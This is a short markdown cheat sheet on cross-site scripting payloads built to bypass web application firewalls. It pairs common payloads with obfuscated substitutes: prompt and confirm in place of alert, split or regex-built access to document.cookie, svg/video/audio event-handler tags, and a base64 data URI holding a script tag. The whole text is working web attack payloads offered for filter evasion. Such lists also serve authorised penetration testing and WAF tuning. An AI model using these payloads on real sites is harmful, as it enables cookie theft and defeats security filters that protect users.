<h1>$${\color{red}Cross-Site} \space {\color{Goldenrod}Scripting }$$</h1>

## Simple Rules to Bypass WAFs

### Instead of using:

```alert('xss')```

```alert(1)```


### 1. The best choise is:

```
prompt('xss')
prompt(8)
confirm('xss')
confirm(8)
alert(/xss/.source)
window[/alert/.source](8)
```

----------------------

### 2. Instead of using:

```alert(document.cookie)```


### The best choise is:

```
with(document)alert(cookie)
alert(document['cookie'])
alert(document[/cookie/.source])
alert(document[/coo/.source+/kie/.source])
```

-----------

### 3. Instead of using:

```<img src=x onerror=alert(1);>```


### The best choise is:

```
<svg/onload=alert(1)>
<video src=x onerror=alert(1);>
<audio src=x onerror=alert(1);>
```


### 4. Instead of using:

```javascript:alert(document.cookie)```


### The best choise is:

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

![image](https://github.com/user-attachments/assets/9b437a30-1365-4301-96f5-a6cedc4dc515)
